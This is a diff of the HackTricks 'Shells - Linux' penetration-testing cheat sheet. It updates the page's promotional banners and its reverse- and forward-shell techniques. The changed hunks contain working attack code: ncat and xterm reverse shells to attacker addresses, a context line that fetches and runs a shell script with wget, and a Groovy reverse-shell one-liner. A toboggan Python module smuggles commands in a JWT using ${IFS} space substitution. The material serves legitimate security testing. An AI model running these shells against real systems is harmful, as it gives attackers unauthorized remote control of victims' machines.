@@ -1,16 +1,27 @@
 # Shells - Linux
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary>Support HackTricks</summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+
+**Try Hard Security Group**
+
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
 
 **If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com)
 
@@ -63,8 +74,44 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 
 ## Forward Shell
 
-You might find cases where you have an **RCE in a web app in a Linux machine** but due to Iptables rules or other kinds of filtering **you cannot get a reverse shell**. This "shell" allows you to maintain a PTY shell through that RCE using pipes inside the victim system.\
-You can find the code in [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
+When dealing with a **Remote Code Execution (RCE)** vulnerability within a Linux-based web application, achieving a reverse shell might be obstructed by network defenses like iptables rules or intricate packet filtering mechanisms. In such constrained environments, an alternative approach involves establishing a PTY (Pseudo Terminal) shell to interact with the compromised system more effectively.
+
+A recommended tool for this purpose is [toboggan](https://github.com/n3rada/toboggan.git), which simplifies interaction with the target environment.
+
+To utilize toboggan effectively, create a Python module tailored to the RCE context of your target system. For example, a module named `nix.py` could be structured as follows:
+```python3
+import jwt
+import httpx
+
+def execute(command: str, timeout: float = None) -> str:
+    # Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
+    token = jwt.encode(
+        {"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
+    )
+
+    response = httpx.get(
+        url="https://vulnerable.io:3200",
+        headers={"Authorization": f"Bearer {token}"},
+        timeout=timeout,
+        # ||BURP||
+        verify=False,
+    )
+
+    # Check if the request was successful
+    response.raise_for_status()
+
+    return response.text
+```
+
+And then, you can run:
+```shell
+toboggan -m nix.py -i
+```
+
+To directly leverage an interractive shell. You can add `-b` for Burpsuite integration and remove the `-i` for a more basic rce wrapper.
+
+
+Another possibility consist using the `IppSec` forward shell implementation [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 You just need to modify:
 
@@ -166,8 +213,8 @@ p.waitFor()
 ## Ncat
 
 ```bash
-victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
-attacker> ncat -v 10.0.0.22 4444 --ssl
+victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
+attacker> ncat -l <port,eg.443> --ssl
 ```
 
 ## Golang
@@ -319,22 +366,19 @@ BEGIN {
 
 ## Xterm
 
-One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
+This will try to connect to your system at port 6001:
 
 ```bash
 xterm -display 10.0.0.1:1
 ```
 
-To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):
+To catch the reverse shell you can use (which will listen in port 6001):
 
 ```bash
-Xnest :1
-```
-
-You’ll need to authorise the target to connect to you (command also run on your host):
-
-```bash
+# Authorize host
 xhost +targetip
+# Listen
+Xnest :1
 ```
 
 ## Groovy
@@ -348,24 +392,30 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-## Bibliography
+## References
 
-{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}
+* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
+* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}
+**Try Hard Security Group**
 
-{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary>Support HackTricks</summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
